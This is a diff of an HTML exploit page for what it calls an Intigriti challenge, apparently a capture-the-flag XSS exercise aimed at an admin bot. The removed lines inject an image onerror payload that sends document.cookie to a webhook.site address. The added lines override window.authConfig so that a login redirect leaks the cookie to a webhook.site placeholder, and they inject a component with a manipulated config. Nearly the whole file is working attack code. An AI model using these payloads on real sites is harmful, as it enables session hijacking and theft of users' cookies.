@@ -1,32 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti Challenge Exploit</title>
+    <title>Exploit</title>
 </head>
 <body>
-    <h1>Admin Bot Exploit Page</h1>
-    
-    <div data-component="true" data-config='{"path":"/js/","type":"../purify"}'>x</div>
-    
     <script>
-        // Since purify.min.js is loaded, we can use it to bypass sanitization
-        // But we need to wait for component to load
-        setTimeout(() => {
-            // After component loads, we can manipulate the DOM
-            const container = document.getElementById('resultsContainer');
-            if (container) {
-                // Inject XSS payload that will trigger on admin's session
-                container.innerHTML += '<img src=x onerror="fetch(\'https://webhook.site/7dbceb0c-65a4-41d5-bde4-23b7b79daf47?cookie=\'+document.cookie)">';
-            }
-        }, 1000);
-        
-        // Alternative: Use the authConfig prototype pollution
+        // Override authConfig before any components load
         window.authConfig = {
             dataset: {
-                next: 'javascript:alert(document.cookie)',
+                next: 'https://webhook.site/YOUR_ID/?c=',
                 append: 'true'
             }
         };
+        
+        // Create a component that will cause a redirect after DOM is ready
+        document.addEventListener('DOMContentLoaded', () => {
+            // Create and inject a component
+            const div = document.createElement('div');
+            div.setAttribute('data-component', 'true');
+            div.setAttribute('data-config', '{"path":"/js/","type":"purify"}');
+            document.body.appendChild(div);
+            
+            // Wait for component to load, then trigger
+            setTimeout(() => {
+                if (window.Auth && window.Auth.loginRedirect) {
+                    window.Auth.loginRedirect({});
+                }
+            }, 500);
+        });
     </script>
+    
+    <!-- Also include the component markup directly -->
+    <div data-component="true" data-config='{"path":"/js/","type":"purify"}'></div>
 </body>
 </html>
